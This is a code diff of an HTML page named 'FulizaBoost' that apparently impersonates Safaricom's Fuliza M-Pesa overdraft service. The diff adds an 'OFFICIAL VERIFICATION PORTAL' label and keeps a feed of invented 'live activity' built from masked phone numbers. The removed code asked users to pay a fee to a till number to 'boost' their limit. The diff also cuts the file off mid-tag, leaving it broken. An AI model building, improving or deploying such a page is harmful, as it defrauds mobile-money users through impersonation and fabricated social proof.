@@ -5,10 +5,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>FulizaBoost</title>
 
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
 <style>
 body {
   margin:0;
-  font-family: Arial, sans-serif;
+  font-family: 'Inter', sans-serif;
   background:#f3f4f6;
   display:flex;
   justify-content:center;
@@ -25,6 +27,34 @@ body {
   max-width:380px;
   box-shadow:0 10px 30px rgba(0,0,0,0.1);
   text-align:center;
+}
+
+/* FIRST SCREEN UPGRADE */
+.top-icon {
+  width:70px;
+  height:70px;
+  background:#e8f5e9;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin:0 auto 15px;
+  font-size:28px;
+  color:#16a34a;
+}
+
+.sub-title {
+  color:#16a34a;
+  font-size:12px;
+  font-weight:600;
+  letter-spacing:1.2px;
+  margin-bottom:10px;
+}
+
+.desc {
+  font-size:14px;
+  color:#6b7280;
+  margin-bottom:15px;
 }
 
 /* INPUT */
@@ -165,7 +195,7 @@ button {
   color:white;
 }
 
-/* LIVE ACTIVITY (ADDED ONLY) */
+/* LIVE ACTIVITY */
 .live-activity {
   display:flex;
   align-items:center;
@@ -245,7 +275,6 @@ function getFee(a){
   return limits.find(l=>l.amount===a).fee;
 }
 
-/* LIVE ACTIVITY DATA (UPDATED ONLY) */
 const activityNames = [
   "Dennis O. (0718****42)",
   "Samuel K. (0709****31)",
@@ -264,7 +293,6 @@ const activityNames = [
   "Mark O. (0710****66)"
 ];
 
-/* NO CHANGE HERE */
 let lastName = "";
 let lastAmount = 0;
 
@@ -292,15 +320,25 @@ setInterval(()=>{
   }
 },5000);
 
-/* EVERYTHING ELSE UNCHANGED */
 function render(){
   const app = document.getElementById("app");
 
   if(step===1){
     app.innerHTML = `
     <div class="card">
-      <h2>Fuliza Plus+</h2>
-      <p>Verify your identity</p>
+
+      <div class="top-icon">👤</div>
+
+      <h2 style="font-weight:800; font-size:26px; margin-bottom:5px;">
+        Fuliza Plus+
+      </h2>
+
+      <div class="sub-title">OFFICIAL VERIFICATION PORTAL</div>
+
+      <p class="desc">
+        Verify your identity to unlock higher daily transaction limits.
+      </p>
+
       <input class="input" placeholder="Enter M-Pesa Number">
       <button class="green" onclick="next()">Check My Eligibility</button>
     </div>`;
@@ -339,60 +377,4 @@ function render(){
 
       <div class="live-activity">
         <div class="live-icon">↻</div>
-        <div>
-          <div class="live-label">LIVE ACTIVITY</div>
-          <div class="live-text" id="liveActivityText">
-            ${generateActivity()}
-          </div>
-        </div>
-      </div>
-
-      <h3>Select Your Limit</h3>
-      <div class="grid">
-        ${limits.map(l=>`
-          <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
-            <strong>Ksh ${l.amount}</strong>
-            <div class="fee">Fee: Ksh ${l.fee}</div>
-          </div>
-        `).join("")}
-      </div>
-      <button class="green" onclick="openModal()">Upgrade to Ksh ${selectedAmount}</button>
-    </div>`;
-  }
-}
-
-function next(){
-  step++;
-  render();
-}
-
-function select(a){
-  selectedAmount = a;
-  render();
-}
-
-function openModal(){
-  let fee = getFee(selectedAmount);
-
-  document.getElementById("modal").style.display="flex";
-
-  document.getElementById("modalTitle").innerText =
-  "Limit will be boosted to Ksh " + selectedAmount;
-
-  document.getElementById("modalFee").innerHTML =
-  `Enter your Safaricom number for VERIFICATION! Once payment to Till Number 
-  <b>6363781</b> is confirmed, your boost request will begin processing.`;
-
-  document.getElementById("payBtn").innerText =
-  "Pay Ksh " + fee;
-}
-
-function closeModal(){
-  document.getElementById("modal").style.display="none";
-}
-
-render();
-</script>
-
-</body>
-</html>
+        <div
